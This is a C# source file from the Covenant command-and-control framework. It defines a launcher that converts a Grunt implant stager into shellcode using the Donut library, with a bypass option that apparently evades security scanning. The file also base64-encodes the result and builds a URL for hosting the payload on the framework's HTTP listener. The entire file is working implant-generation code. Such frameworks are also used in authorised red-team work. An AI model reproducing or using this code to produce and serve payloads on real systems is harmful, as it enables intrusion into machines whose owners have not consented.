// Author: Ryan Cobb (@cobbr_io)
// Project: Covenant (https://github.com/cobbr/Covenant)
// License: GNU GPLv3

using System;
using System.IO;
using System.Linq;
using Microsoft.CodeAnalysis;

using Donut;
using Donut.Structs;

using Covenant.Core;
using Covenant.Models.Listeners;
using Covenant.Models.Grunts;

namespace Covenant.Models.Launchers
{
    public class ShellCodeLauncher : Launcher
    {
        public ShellCodeLauncher()
        {
            this.Type = LauncherType.ShellCode;
            this.Description = "Converts a Grunt to ShellCode using Donut.";
            this.Name = "ShellCode";
            this.OutputKind = OutputKind.ConsoleApplication;
            this.CompressStager = false;
        }

        public override string GetLauncher(string StagerCode, byte[] StagerAssembly, Grunt grunt, ImplantTemplate template)
        {
            this.StagerCode = StagerCode;
            string inputf = Common.CovenantTempDirectory + Utilities.GetSanitizedFilename(template.Name + ".exe");
            string outputf = Common.CovenantTempDirectory + Utilities.GetSanitizedFilename(template.Name + ".bin");
            File.WriteAllBytes(inputf, StagerAssembly);
            DonutConfig config = new DonutConfig
            {
                Arch = 3,
                Bypass = 3,
                InputFile = inputf,
                Class = "GruntStager",
                Method = "Execute",
                Args = "",
                Payload = outputf
            };
            int ret = Generator.Donut_Create(ref config);
            if (ret == Constants.DONUT_ERROR_SUCCESS)
            {
                this.Base64ILByteString = Convert.ToBase64String(File.ReadAllBytes(outputf));
                this.LauncherString = template.Name + ".bin";
            }
            return this.LauncherString;
        }

        public override string GetHostedLauncher(Listener listener, HostedFile hostedFile)
        {
            HttpListener httpListener = (HttpListener)listener;
            if (httpListener != null)
            {
                Uri hostedLocation = new Uri(httpListener.Urls.FirstOrDefault() + hostedFile.Path);
                this.LauncherString = hostedFile.Path.Split("\\").Last().Split("/").Last();
                return hostedLocation.ToString();
            }
            else { return ""; }
        }
    }
}
